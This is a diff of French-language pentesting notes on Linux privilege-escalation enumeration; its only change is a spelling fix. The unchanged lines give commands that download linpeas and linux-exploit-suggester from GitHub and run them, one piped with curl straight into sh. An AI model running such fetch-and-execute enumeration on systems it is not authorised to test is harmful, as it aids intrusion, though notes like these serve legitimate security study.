@@ -14,7 +14,7 @@ To do list :
 
 Programme d'énumération :
 
-- Pour chopper le plus d'information possible, on va se servir de programme qui vont automatisée l'énumération :
+- Pour chopper le plus d'information possible, on va se servir de programme qui vont automatiser l'énumération :
     - LinEnum
     - Linpeas (cheaté), on peut l'utiliser en faisant curl -L [https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh") | sh ou sinon tu l'envoie en partage de fichier via ta machine. Pense aussi à faire chmod 755 ./linpeas.sh
     - linux-exploit-suggester, on peut l'utiliser en faisant wget [https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh") -O les.sh apres tu fais chmod 755 ./les.sh et enfin ./les.sh
